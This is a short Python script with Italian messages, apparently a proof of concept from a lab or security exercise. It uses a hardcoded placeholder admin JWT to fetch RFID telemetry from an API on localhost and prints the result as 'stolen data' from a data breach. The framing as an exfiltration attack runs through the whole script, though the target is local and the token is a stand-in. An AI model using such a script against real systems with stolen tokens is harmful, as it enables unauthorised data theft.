import requests

URL = "http://localhost:5000/api/v1/rfid/telemetry"
TOKEN = "JWT_ADMIN_VALIDO_12345"
HEADERS = {"Authorization": f"Bearer {TOKEN}"}

print("[*] Inizio esfiltrazione dati RFID (Data Breach)...")

try:
    response = requests.get(URL, headers=HEADERS)
    print(f"[*] Codice di stato HTTP: {response.status_code}")
    if response.status_code == 200:
        print("[+] DATI RUBATI CON SUCCESSO:")
        import json
        print(json.dumps(response.json(), indent=4))
    else:
        print(f"[-] Errore: {response.text}")
except requests.exceptions.RequestException as e:
    print(f"[!] Errore di connessione: {e}")
